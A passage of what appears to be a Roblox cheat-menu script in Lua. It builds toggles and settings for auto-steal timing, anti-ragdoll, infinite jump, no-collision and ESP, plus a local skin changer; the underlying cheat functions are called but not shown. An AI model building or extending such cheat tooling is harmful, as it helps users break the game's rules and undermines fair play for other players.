        minusBtn.Font = Enum.Font.GothamBlack
        minusBtn.TextSize = 16
        minusBtn.ZIndex = 12
        mkCorner(minusBtn, 7)
        local plusBtn = Instance.new("TextButton", stopTimeRow)
        plusBtn.Size = UDim2.new(0, 26, 0, 24)
        plusBtn.Position = UDim2.new(1, -50, 0.5, -12)
        plusBtn.BackgroundColor3 = C.panel
        plusBtn.BorderSizePixel = 0
        plusBtn.Text = "+"
        plusBtn.TextColor3 = C.text
        plusBtn.Font = Enum.Font.GothamBlack
        plusBtn.TextSize = 16
        plusBtn.ZIndex = 12
        mkCorner(plusBtn, 7)
        minusBtn.MouseButton1Click:Connect(function()
            local cur = tonumber(State.VLESSVSSemiStopPercent) or 75
            applyStopTime(math.max(1, cur - 1))
            task.spawn(saveConfig)
        end)
        plusBtn.MouseButton1Click:Connect(function()
            local cur = tonumber(State.VLESSVSSemiStopPercent) or 75
            applyStopTime(math.min(100, cur + 1))
            task.spawn(saveConfig)
        end)
        stopTimeBox.FocusLost:Connect(function()
            applyStopTime(stopTimeBox.Text)
            task.spawn(saveConfig)
        end)
        _G.AmbitiousStopTimeBox = stopTimeBox
    end

    -- The donor's Delay Radius uses the same native row styling as Stop Time.
    do
        delayRadiusRow = stopTimeRow:Clone()
        delayRadiusRow.LayoutOrder = LO()
        delayRadiusRow.Parent = tabSteal
        local input = delayRadiusRow:FindFirstChildOfClass("TextBox")
        local label = delayRadiusRow:FindFirstChildOfClass("TextLabel")
        if label then label.Text = "Delay Radius" end
        if input then
            input.Text = tostring(autoGrabDelayRadius or 8)
            local function applyDelay(v)
                v = tonumber(v)
                if v and v > 0 and v <= 500 then
                    autoGrabDelayRadius = v
                    _G.autoGrabDelayRadius = v
                    Steal.AutoGrabDelayRadius = v
                    if _G.AmbitiousSemiV2Steal then _G.AmbitiousSemiV2Steal.autoGrabSetDelayRadius = v end
                end
                input.Text = tostring(autoGrabDelayRadius or 8)
            end
            input.FocusLost:Connect(function() applyDelay(input.Text); task.spawn(saveConfig) end)
            for _, btn in ipairs(delayRadiusRow:GetChildren()) do
                if btn:IsA("TextButton") then
                    local direction = btn.Text == "+" and 1 or -1
                    btn.MouseButton1Click:Connect(function()
                        applyDelay(math.clamp((tonumber(autoGrabDelayRadius) or 8) + direction, 0.1, 500))
                        task.spawn(saveConfig)
                    end)
                end
            end
        end
    end

    local function _VLESSVSApplySyncAfterHit()
        if type(_G._VLESSVSApplySyncAfterHit) == "function" then
            pcall(_G._VLESSVSApplySyncAfterHit)
        else
            State.syncAfterHitEnabled = State.syncAfterHitToggle == true
            if not State.syncAfterHitEnabled and _G._K7SyncAfterHitClear then pcall(_G._K7SyncAfterHitClear) end
        end
    end

    -- Sync After Hit: MysteryVs Ragdoll Steal; morcego pausa V1/V2 por 1.5s, Medusa nao pausa.
    toggleRefs.syncAfterHit = makeToggleRow("Sync After Hit", State.syncAfterHitToggle == true, function(on, isSync)
        State.syncAfterHitToggle = on and true or false
        _VLESSVSApplySyncAfterHit()
        if not isSync then task.spawn(saveConfig) end
    end, nil, tabSteal)

    -- Lock only the Auto Grab panel's dragging; stealing and other UI stay unchanged.
    toggleRefs.lockAutoGrab = makeToggleRow("Lock Auto Grab", State.lockAutoGrab == true, function(on, isSync)
        State.lockAutoGrab = on == true
        if State.lockAutoGrab and StealProgressBar and StealProgressBar.cancelDrag then
            StealProgressBar.cancelDrag()
        end
        if not isSync then task.spawn(saveConfig) end
    end, nil, tabSteal)

    do
        local resetGrabBtn = Instance.new("TextButton", tabSteal)
        resetGrabBtn.Name = "ResetPositionGrab"
        resetGrabBtn.Size = UDim2.new(1, 0, 0, 34)
        resetGrabBtn.BackgroundColor3 = Color3.fromRGB(145, 58, 0)
        resetGrabBtn.BackgroundTransparency = 0
        resetGrabBtn.BorderSizePixel = 0
        resetGrabBtn.Text = "Reset Position Grab"
        resetGrabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        resetGrabBtn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        resetGrabBtn.TextStrokeTransparency = 0
        resetGrabBtn.Font = Enum.Font.GothamBlack
        resetGrabBtn.TextSize = 13
        resetGrabBtn.AutoButtonColor = true
        resetGrabBtn.LayoutOrder = LO()
        resetGrabBtn.ZIndex = 7
        mkCorner(resetGrabBtn, 8)
        local outline = mkStroke(resetGrabBtn, Color3.fromRGB(235, 35, 45), 1.5, 0)
        outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        resetGrabBtn.Activated:Connect(function()
            if StealProgressBar and StealProgressBar.cancelDrag then
                StealProgressBar.cancelDrag()
            end
            local panel = StealProgressBar and StealProgressBar.pbFrame
            local scale = math.clamp(tonumber(State.progressBarScale) or 1, 0.50, 1.50)
            -- The panel's bottom-center anchor needs a half-height offset to center it.
            local halfHeight = 27 * scale
            if panel and panel.Parent then
                local panelScale = StealProgressBar._uiScale
                halfHeight = panel.Size.Y.Offset * (panelScale and panelScale.Scale or scale) / 2
                panel.Position = UDim2.new(0.5, 0, 0.5, halfHeight)
            end
            State.autoGrabPosition = {X = {Scale = 0.5, Offset = 0}, Y = {Scale = 0.5, Offset = halfHeight}}
            task.spawn(saveConfig)
        end)
    end

    refreshStealUI()
    _G._BlastRefreshStealUI = refreshStealUI
end
makeLine(tabSteal)

-- MECH tab
loCount = 0
end
_buildStealTab()

local function _buildMechTab()
makeSectionHeader("MECHANICS", tabMech)
makeMomentaryRow("Drop Brainrot", function()
    runDropBrainrot()
end, "drop", tabMech)

makeMomentaryRow("TP Down", function()
    doTpDown()
end, "tpDown", tabMech)

makeKeybindRow("Auto Left Key", "autoLeft", tabMech)
makeKeybindRow("Auto Right Key", "autoRight", tabMech)

toggleRefs.antiRagdoll = makeToggleRow("Anti Ragdoll", State.antiRagdollEnabled, function(on, isSync)
    State.antiRagdollEnabled = on
    if on then
        startAntiRagdoll()
    else
        stopAntiRagdoll()
    end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabMech)

-- Anti Ragdoll Mode V1/V2 (VX7) - proper hub row
do
    local modeRow = Instance.new("Frame", tabMech)
    modeRow.Size = UDim2.new(1, 0, 0, 34)
    modeRow.BackgroundColor3 = C.card
    modeRow.BackgroundTransparency = 0.55
    modeRow.BorderSizePixel = 0
    modeRow.LayoutOrder = LO()
    modeRow.ZIndex = 7
    styleXzzRow(modeRow)

    local modeLbl = Instance.new("TextLabel", modeRow)
    modeLbl.Size = UDim2.new(1, -110, 1, 0)
    modeLbl.Position = UDim2.new(0, 12, 0, 0)
    modeLbl.BackgroundTransparency = 1
    modeLbl.Text = "Anti Ragdoll Mode"
    modeLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    modeLbl.Font = Enum.Font.GothamBlack
    modeLbl.TextSize = 13
    modeLbl.TextXAlignment = Enum.TextXAlignment.Left
    modeLbl.ZIndex = 8

    local v1Btn = Instance.new("TextButton", modeRow)
    v1Btn.Size = UDim2.new(0, 40, 0, 22)
    v1Btn.Position = UDim2.new(1, -94, 0.5, -11)
    v1Btn.BackgroundColor3 = (State.antiRagdollMode ~= "V2") and C.accent or C.panel
    v1Btn.BackgroundTransparency = 0.1
    v1Btn.BorderSizePixel = 0
    v1Btn.Text = "V1"
    v1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    v1Btn.Font = Enum.Font.GothamBlack
    v1Btn.TextSize = 12
    v1Btn.AutoButtonColor = false
    v1Btn.ZIndex = 9
    mkCorner(v1Btn, 7)
    mkStroke(v1Btn, C.accent, 1.1, 0.2)

    local v2Btn = Instance.new("TextButton", modeRow)
    v2Btn.Size = UDim2.new(0, 40, 0, 22)
    v2Btn.Position = UDim2.new(1, -48, 0.5, -11)
    v2Btn.BackgroundColor3 = (State.antiRagdollMode == "V2") and C.accent or C.panel
    v2Btn.BackgroundTransparency = 0.1
    v2Btn.BorderSizePixel = 0
    v2Btn.Text = "V2"
    v2Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    v2Btn.Font = Enum.Font.GothamBlack
    v2Btn.TextSize = 12
    v2Btn.AutoButtonColor = false
    v2Btn.ZIndex = 9
    mkCorner(v2Btn, 7)
    mkStroke(v2Btn, C.accent, 1.1, 0.2)

    local function paintMode()
        local isV2 = State.antiRagdollMode == "V2"
        v1Btn.BackgroundColor3 = (not isV2) and C.accent or C.panel
        v2Btn.BackgroundColor3 = isV2 and C.accent or C.panel
    end

    v1Btn.MouseButton1Click:Connect(function()
        State.antiRagdollMode = "V1"
        paintMode()
        if State.antiRagdollEnabled then startAntiRagdoll() end
        task.spawn(saveConfig)
    end)
    v2Btn.MouseButton1Click:Connect(function()
        State.antiRagdollMode = "V2"
        paintMode()
        if State.antiRagdollEnabled then startAntiRagdoll() end
        task.spawn(saveConfig)
    end)
    paintMode()
end

toggleRefs.infJump = makeToggleRow("Infinite Jump", State.infJumpEnabled, function(on, isSync)
    State.infJumpEnabled = on
    if on then startInfJump() else stopInfJump() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabMech)

toggleRefs.unwalk = makeToggleRow("Unwalk", State.unwalkEnabled, function(on, isSync)
    State.unwalkEnabled = on
    if on then startUnwalk() else stopUnwalk() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabMech)

toggleRefs.noCollide = makeToggleRow("No Colision", State.noCollideEnabled, function(on, isSync)
    State.noCollideEnabled = on
    if on then
        startNoCollide()
    else
        stopNoCollide()
    end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabMech)

toggleRefs.uiLocked = makeToggleRow("Lock UI", State.uiLocked, function(on, isSync)
    State.uiLocked = on; if not isSync then task.spawn(saveConfig) end
end, nil, tabMech)

toggleRefs.headless = makeToggleRow("Headles", State.headlessEnabled, function(on, isSync)
    State.headlessEnabled = on
    if on then _G.BlastApplyHeadless() else _G.BlastStopHeadless() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabMech)

toggleRefs.korblox = makeToggleRow("Korblox", State.korbloxEnabled, function(on, isSync)
    State.korbloxEnabled = on
    if on then _G.BlastApplyKorblox() else _G.BlastStopKorblox() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabMech)

makeLine(tabMech)

-- VISUAL tab
loCount = 0
end
_buildMechTab()

makeSectionHeader("VISUAL", tabVis)

toggleRefs.fov = makeToggleRow("FOV", State.fovEnabled, function(on, isSync)
    State.fovEnabled = on
    if on then _G.BlastEnableCustomFov() else _G.BlastDisableCustomFov() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)

makeInputRow("FOV Value", State.fovValue, function(value)
    if value >= 30 and value <= 120 then
        State.fovValue = value
        if State.fovEnabled and workspace.CurrentCamera then
            workspace.CurrentCamera.FieldOfView = State.fovValue
        end
        task.spawn(saveConfig)
    end
end, tabVis)

-- toggleRefs.customFont = makeToggleRow("Custom Font", State.customFontEnabled, function(on, isSync)
--     State.customFontEnabled = on
--     if on then enableCustomFont() else disableCustomFont() end
--     if not isSync then task.spawn(saveConfig) end
-- end, nil, tabVis)
toggleRefs.stretchRez = makeToggleRow("Stretch Rez", State.stretchRezEnabled, function(on, isSync)
    State.stretchRezEnabled = on
    if on then enableStretchRez() else disableStretchRez() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)

makeSectionHeader("MOBILE BUTTONS", tabVis)

-- Button Size: dedicated control (0.50 → 2.50 step 0.10) — not makeSpeedRow (that floors to int)
do
    local row = Instance.new("Frame", tabVis)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.05
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    styleXzzRow(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.45, 0, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "Button Size"
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 12

    local function fmt(v)
        return string.format("%.2f", math.clamp(tonumber(v) or 1, 0.5, 2.5))
    end

    local function applyScale(v)
        v = math.clamp(tonumber(v) or 1, 0.5, 2.5)
        -- snap to 0.05
        v = math.floor(v * 20 + 0.5) / 20
        State.mobileButtonScale = v
        if _G.BlastApplyMobileButtonScale then
            pcall(_G.BlastApplyMobileButtonScale, v)
        end
        task.spawn(saveConfig)
        return v
    end

    local valBox = Instance.new("TextBox", row)
    valBox.Size = UDim2.new(0, 52, 0, 24)
    valBox.Position = UDim2.new(1, -120, 0.5, -12)
    valBox.BackgroundColor3 = C.panel
    valBox.BackgroundTransparency = 0.18
    valBox.BorderSizePixel = 0
    valBox.Text = fmt(State.mobileButtonScale or 1)
    valBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    valBox.Font = Enum.Font.GothamBlack
    valBox.TextSize = 12
    valBox.ClearTextOnFocus = false
    valBox.ZIndex = 12
    mkCorner(valBox, 7)
    mkStroke(valBox, C.border, 1, 0.45)

    local minusBtn = Instance.new("TextButton", row)
    minusBtn.Size = UDim2.new(0, 26, 0, 24)
    minusBtn.Position = UDim2.new(1, -150, 0.5, -12)
    minusBtn.BackgroundColor3 = C.panel
    minusBtn.BackgroundTransparency = 0.1
    minusBtn.BorderSizePixel = 0
    minusBtn.Text = "-"
    minusBtn.TextColor3 = C.text
    minusBtn.Font = Enum.Font.GothamBlack
    minusBtn.TextSize = 16
    minusBtn.ZIndex = 12
    mkCorner(minusBtn, 7)

    local plusBtn = Instance.new("TextButton", row)
    plusBtn.Size = UDim2.new(0, 26, 0, 24)
    plusBtn.Position = UDim2.new(1, -62, 0.5, -12)
    plusBtn.BackgroundColor3 = C.panel
    plusBtn.BackgroundTransparency = 0.1
    plusBtn.BorderSizePixel = 0
    plusBtn.Text = "+"
    plusBtn.TextColor3 = C.text
    plusBtn.Font = Enum.Font.GothamBlack
    plusBtn.TextSize = 16
    plusBtn.ZIndex = 12
    mkCorner(plusBtn, 7)

    minusBtn.MouseButton1Click:Connect(function()
        local v = applyScale((tonumber(State.mobileButtonScale) or 1) - 0.10)
        valBox.Text = fmt(v)
    end)
    plusBtn.MouseButton1Click:Connect(function()
        local v = applyScale((tonumber(State.mobileButtonScale) or 1) + 0.10)
        valBox.Text = fmt(v)
    end)
    valBox.FocusLost:Connect(function()
        local v = applyScale(valBox.Text)
        valBox.Text = fmt(v)
    end)
end

makeMomentaryRow("Reset Mob Pos", function()
    State.mobileButtonPositions = {}
    -- Restore default grid positions
    local x1, x2, x3 = -196, -128, -60
    local y1, y2, y3, y4 = -210, -140, -70, 0
    local defaults = {
        tpBat       = UDim2.new(1, x1, 0.5, y1),
        drop        = UDim2.new(1, x2, 0.5, y1),
        autoLeft    = UDim2.new(1, x3, 0.5, y1),
        batAimbot   = UDim2.new(1, x2, 0.5, y2),
        batBypass   = UDim2.new(1, x1, 0.5, y2),
        autoRight   = UDim2.new(1, x3, 0.5, y2),
        tp          = UDim2.new(1, x2, 0.5, y3),
        carry       = UDim2.new(1, x3, 0.5, y3),
        lagger      = UDim2.new(1, x2, 0.5, y4),
        carryLagger = UDim2.new(1, x3, 0.5, y4),
    }
    for key, entry in pairs(mobileButtons or {}) do
        local holder = entry and entry.holder
        if holder and defaults[key] then
            holder.Position = defaults[key]
        end
    end
    if _G.BlastClampMobileButtons then task.defer(_G.BlastClampMobileButtons) end
    task.spawn(saveConfig)
    pcall(function()
        if _safeNotify then _safeNotify("MOBILE POS RESET") else print("[BLAST] MOBILE POS RESET") end
    end)
end, nil, tabVis)

toggleRefs.esp = makeToggleRow("Esp", State.espEnabled, function(on, isSync)
    State.espEnabled = on
    if on then ESP.start() else ESP.stop() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)

-- ESP Mode options
local modeNoLineBtn, modeWithLineBtn

do
    local row = Instance.new("Frame", tabVis)
    row.Size = UDim2.new(1, 0, 0, 28)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.05
    row.BorderSizePixel = 0
    row.LayoutOrder = loCount
    loCount = loCount + 1
    row.ZIndex = 7
    mkCorner(row, 9)
    mkStroke(row, C.border, 1.15, 0.38)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0, 35, 1, 0)
    lbl.Position = UDim2.new(0, 8, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "Mode"
    lbl.TextColor3 = C.text
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 8

    -- NO LINE button
    modeNoLineBtn = Instance.new("TextButton", row)
    modeNoLineBtn.Size = UDim2.new(0, 70, 0, 18)
    modeNoLineBtn.Position = UDim2.new(0, 48, 0.5, -9)
    modeNoLineBtn.BackgroundColor3 = State.espMode == "noLine" and C.accent or Color3.fromRGB(50, 30, 22)
    modeNoLineBtn.BackgroundTransparency = 0.2
    modeNoLineBtn.BorderSizePixel = 0
    modeNoLineBtn.Text = "NO LINE"
    modeNoLineBtn.TextColor3 = C.text
    modeNoLineBtn.Font = Enum.Font.GothamBold
    modeNoLineBtn.TextSize = 8
    modeNoLineBtn.ZIndex = 8
    mkCorner(modeNoLineBtn, 4)

    modeNoLineBtn.MouseButton1Click:Connect(function()
        State.espMode = "noLine"
        modeNoLineBtn.BackgroundColor3 = C.accent
        modeWithLineBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 22)
        -- Recria todos os ESP para aplicar o novo mode
        if State.espEnabled then
            ESP.stop()
            ESP.start()
        end
        task.spawn(saveConfig)
    end)

    -- WITH LINE button
    modeWithLineBtn = Instance.new("TextButton", row)
    modeWithLineBtn.Size = UDim2.new(0, 90, 0, 18)
    modeWithLineBtn.Position = UDim2.new(0, 123, 0.5, -9)
    modeWithLineBtn.BackgroundColor3 = State.espMode == "withLine" and C.accent or Color3.fromRGB(50, 30, 22)
    modeWithLineBtn.BackgroundTransparency = 0.2
    modeWithLineBtn.BorderSizePixel = 0
    modeWithLineBtn.Text = "WITH LINE"
    modeWithLineBtn.TextColor3 = C.text
    modeWithLineBtn.Font = Enum.Font.GothamBold
    modeWithLineBtn.TextSize = 8
    modeWithLineBtn.ZIndex = 8
    mkCorner(modeWithLineBtn, 4)

    modeWithLineBtn.MouseButton1Click:Connect(function()
        State.espMode = "withLine"
        modeWithLineBtn.BackgroundColor3 = C.accent
        modeNoLineBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 22)
        if State.espEnabled then
            ESP.stop()
            ESP.start()
        end
        task.spawn(saveConfig)
    end)
end

-- ============================================================
-- SKIN CHANGER (robust local outfits — Humanoid:AddAccessory)
-- ============================================================
do
    local okSkin, errSkin = pcall(function()
    local InsertService = game:GetService("InsertService")

    -- bodyItems = R15 layered body package pieces that make outfits sit correctly
    -- Space Hub outfits (Tenue 1-5) — same data + apply method

    -- ===================== BLEED SKINS + CUSTOM TOOLS (from prime.vs) =====================
    local BleedEng = { active = "Off" }
    do
local InsertService = game:GetService("InsertService")
local SKIN_BAT = {
{id=126653333198410, name="Bloody Katana", soundId="rbxassetid://111808555599832", c0=CFrame.new()},
}
local SKIN_BAT_BY_ID = {}
for _, skin in ipairs(SKIN_BAT) do SKIN_BAT_BY_ID[tostring(skin.id)] = skin end
local batSkinSoundConnections = setmetatable({}, {__mode = "k"})
local function getBatSkinConfig(assetId)
return SKIN_BAT_BY_ID[tostring(tonumber(tostring(assetId):match("%d+")) or assetId)]
end
local function setBatSkinSound(tool, assetId)
if not tool then return end
local config = getBatSkinConfig(assetId)
local desired = config and config.soundId or nil
tool:SetAttribute("PVSCurrentBatSkinId", desired and tostring(config.id) or nil)
for _, sound in ipairs(tool:GetDescendants()) do
if sound:IsA("Sound") and sound.Name == "Slash" then
local original = sound:GetAttribute("PVSOriginalSlashSound")
if desired then
if original == nil then sound:SetAttribute("PVSOriginalSlashSound", sound.SoundId) end
sound.SoundId = desired
elseif original ~= nil then
sound.SoundId = original
sound:SetAttribute("PVSOriginalSlashSound", nil)
end
end
end
if not batSkinSoundConnections[tool] then
batSkinSoundConnections[tool] = tool.DescendantAdded:Connect(function(object)
if not object:IsA("Sound") or object.Name ~= "Slash" then return end
local activeId = tool:GetAttribute("PVSCurrentBatSkinId")
if activeId then task.defer(setBatSkinSound, tool, activeId) end
end)
end
end
local function loadAssetObjects(assetId)
assetId = tonumber(tostring(assetId):match("%d+"))
if not assetId then return nil end
local ok, res = pcall(function()
return game:GetObjects("rbxassetid://" .. tostring(assetId))
end)
if ok and type(res) == "table" and #res > 0 then return res end
ok, res = pcall(function() return InsertService:LoadAsset(tonumber(assetId)) end)
if ok and res then
if res:IsA("Model") then
local children = res:GetChildren()
if #children > 0 then return children end
return { res }
end
return { res }
end
return nil
end
local function getCharModel()
return workspace:FindFirstChild(LP.Name) or LP.Character
end
local function getBatTool()
local model = getCharModel()
if model then
local bat = model:FindFirstChild("Bat")
if bat then return bat end
end
local bp = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
if bp then
local bat = bp:FindFirstChild("Bat")
if bat then return bat end
end
return nil
end
local function getMedusaTool()
local model = getCharModel()
if model then
local med = model:FindFirstChild("Medusa's Head")
if med then return med end
end
local bp = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
if bp then
local med = bp:FindFirstChild("Medusa's Head")
if med then return med end
end
return nil
end
local function clearGearVisual(tool)
if not tool then return end
pcall(function()
local folder = tool:FindFirstChild("Hub073GearVisual")
if folder then folder:Destroy() end
local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")
if handle then
for _, ch in ipairs(handle:GetChildren()) do
if ch.Name == "Hub073GearMesh" or (ch:IsA("SpecialMesh") and ch:GetAttribute("Hub073")) then
ch:Destroy()
end
end
local orig = tool:GetAttribute("Hub073OrigHandleTrans")
if orig ~= nil then
handle.Transparency = orig
elseif handle.Transparency >= 0.99 then
handle.Transparency = 0
end
end
end)
end
local function applyAssetToTool(tool, assetId)
if not tool or not assetId then return false end
if tool:GetAttribute("Hub073Applying") then return false end
tool:SetAttribute("Hub073Applying", true)
assetId = tonumber(tostring(assetId):match("%d+")) or assetId
local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")
if not handle then
tool:SetAttribute("Hub073Applying", nil)
return false
end
local success = false
pcall(function()
clearGearVisual(tool)
if tool:GetAttribute("Hub073OrigHandleTrans") == nil then
tool:SetAttribute("Hub073OrigHandleTrans", handle.Transparency)
end
local objs = loadAssetObjects(assetId)
if not objs or #objs == 0 then return end
local folder = Instance.new("Folder")
folder.Name = "Hub073GearVisual"
folder.Parent = tool
local srcTool, srcHandle
for _, o in ipairs(objs) do
if o:IsA("Tool") then
srcTool = o
srcHandle = o:FindFirstChild("Handle") or o:FindFirstChildWhichIsA("BasePart")
break
end
local t = o:FindFirstChildOfClass("Tool") or o:FindFirstChildWhichIsA("Tool", true)
if t then
srcTool = t
srcHandle = t:FindFirstChild("Handle") or t:FindFirstChildWhichIsA("BasePart")
break
end
end
if not srcHandle then
for _, o in ipairs(objs) do
if o:IsA("BasePart") then srcHandle = o; break end
local p = o:FindFirstChildWhichIsA("BasePart", true)
if p then srcHandle = p; break end
end
end
local skinConfig = tool.Name == "Bat" and getBatSkinConfig(assetId) or nil
local orientFix = skinConfig and skinConfig.c0 or CFrame.new()
local parts = {}
local root = srcTool or objs[1]
if root then
if root:IsA("BasePart") then table.insert(parts, root) end
if root:IsA("Accessory") then
local ah = root:FindFirstChild("Handle")
if ah then table.insert(parts, ah) end
end
for _, d in ipairs(root:GetDescendants()) do
if d:IsA("BasePart") then table.insert(parts, d) end
end
end
if #parts == 0 and srcHandle then
table.insert(parts, srcHandle)
end
local seen = {}
local unique = {}
for _, p in ipairs(parts) do
if not seen[p] then
seen[p] = true
table.insert(unique, p)
end
end
parts = unique
if #parts > 0 then
handle.Transparency = 1
local pivot = srcHandle or parts[1]
for _, src in ipairs(parts) do
local okc, clone = pcall(function() return src:Clone() end)
if okc and clone then
clone.Name = "GV_" .. tostring(src.Name)
clone.Anchored = false
clone.CanCollide = false
clone.Massless = true
pcall(function()
clone.CanQuery = false
clone.CanTouch = false
end)
local rel = pivot.CFrame:ToObjectSpace(src.CFrame)
clone.CFrame = handle.CFrame * orientFix * rel
clone.Parent = folder
local w = Instance.new("Weld")
w.Name = "Hub073GearWeld"
w.Part0 = handle
w.Part1 = clone
w.C0 = orientFix * rel
w.C1 = CFrame.new()
w.Parent = clone
success = true
end
end
elseif srcHandle then
local mesh = srcHandle:FindFirstChildOfClass("SpecialMesh")
if mesh then
local m = mesh:Clone()
m.Name = "Hub073GearMesh"
m:SetAttribute("Hub073", true)
m.Parent = handle
success = true
end
for _, d in ipairs(srcHandle:GetChildren()) do
if d:IsA("Decal") or d:IsA("Texture") then
pcall(function() d:Clone().Parent = handle end)
end
end
pcall(function()
handle.Color = srcHandle.Color
handle.Material = srcHandle.Material
handle.Reflectance = srcHandle.Reflectance
end)
end
for _, o in ipairs(objs) do
pcall(function() o:Destroy() end)
end
end)
tool:SetAttribute("Hub073Applying", nil)
if success and tool.Name == "Bat" then setBatSkinSound(tool, assetId) end
return success
end

        local PACKS = {
            ["Bleed 1"] = { accessory = 306969564, offset = Vector3.new(0, 0.3, 0), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=10632503795", pants = "http://www.roblox.com/asset/?id=123161592384863", korblox = "right" },
            ["Bleed 2"] = { accessory = 1744060292, offset = Vector3.new(0, 1.4, -0.2), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=11526718530", pants = "http://www.roblox.com/asset/?id=93710523210027", korblox = "right" },
            ["Bleed 3"] = { accessory = 112564966849233, offset = Vector3.new(0, 0.6, 0), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=11849088376", pants = "http://www.roblox.com/asset/?id=16534673928", korblox = "right" },
            ["Bleed 4"] = { accessory = 10159600649, offset = Vector3.new(0, 1, -0.2), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=9683332638", pants = "http://www.roblox.com/asset/?id=93182020184041" },
            ["Bleed 5"] = { accessory = 8349240186, offset = Vector3.new(0, 0.9, 0), headMesh = "https://assetdelivery.roblox.com/v1/asset/?id=16673245747", shirt = "http://www.roblox.com/asset/?id=11926549070", pants = "http://www.roblox.com/asset/?id=13189494471" },
        }
        local origOutfit = { shirt = nil, pants = nil }
        local origAcc = {}
        local function saveOutfit(char)
            local sh = char:FindFirstChildWhichIsA("Shirt"); local pa = char:FindFirstChildWhichIsA("Pants")
            origOutfit.shirt = sh and sh.ShirtTemplate or nil
            origOutfit.pants = pa and pa.PantsTemplate or nil
        end
        local function restoreOutfit(char)
            for _, o in ipairs(char:GetChildren()) do if o:IsA("Shirt") or o:IsA("Pants") then o:Destroy() end end
            if origOutfit.shirt then local x = Instance.new("Shirt"); x.ShirtTemplate = origOutfit.shirt; x.Parent = char end
            if origOutfit.pants then local x = Instance.new("Pants"); x.PantsTemplate = origOutfit.pants; x.Parent = char end
        end
        local function saveAcc(char)
            origAcc = {}
            for _, c in ipairs(char:GetChildren()) do
                if (c:IsA("Accessory") or c:IsA("Hat")) and not c:GetAttribute("BlastLocalSkin") then table.insert(origAcc, c:Clone()) end
            end
        end
        local function restoreAcc(char)
            for _, c in ipairs(char:GetChildren()) do
                if ((c:IsA("Accessory") or c:IsA("Hat")) and not c:GetAttribute("BlastLocalSkin")) or c.Name == "073Accessory" then c:Destroy() end
            end
            for _, cl in ipairs(origAcc) do if cl and cl.Parent == nil then cl:Clone().Parent = char end end
        end
        local function clearPack(char)
            for _, c in ipairs(char:GetChildren()) do
                if ((c:IsA("Accessory") or c:IsA("Hat")) and not c:GetAttribute("BlastLocalSkin")) or c.Name == "073Accessory" then c:Destroy() end
                if tostring(c.Name):find("Korblox_") or tostring(c.Name):find("Headless_") then c:Destroy() end
            end
            for _, pn in ipairs({"Head","LeftUpperLeg","LeftLowerLeg","LeftFoot","RightUpperLeg","RightLowerLeg","RightFoot"}) do
                local p = char:FindFirstChild(pn)
                if p and p:IsA("BasePart") then p.Transparency = 0 end
            end
        end
        local function applyBleed(config, char)
            local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 8)
            if not head then return false end
            if config.headMesh then
                local done = false
                if head:IsA("MeshPart") then
                    done = pcall(function()
                        head.MeshId = config.headMesh
                        if config.headTexture then head.TextureID = config.headTexture end
                    end)
                end
                if not done then
                    local sm = head:FindFirstChildWhichIsA("SpecialMesh") or Instance.new("SpecialMesh")
                    sm.Parent = head; sm.MeshType = Enum.MeshType.FileMesh
                    sm.MeshId = config.headMesh; sm.TextureId = config.headTexture or ""
                end
            end
            if config.shirt then local x = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt"); x.Name = "Shirt"; x.ShirtTemplate = config.shirt; x.Parent = char end
            if config.pants then local x = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants"); x.Name = "Pants"; x.PantsTemplate = config.pants; x.Parent = char end
            if config.accessory then
                local old = char:FindFirstChild("073Accessory"); if old then old:Destroy() end
                local objs = loadAssetObjects(config.accessory)
                if objs then
                    local handle
                    for _, o in ipairs(objs) do
                        if o:IsA("BasePart") then handle = o; break end
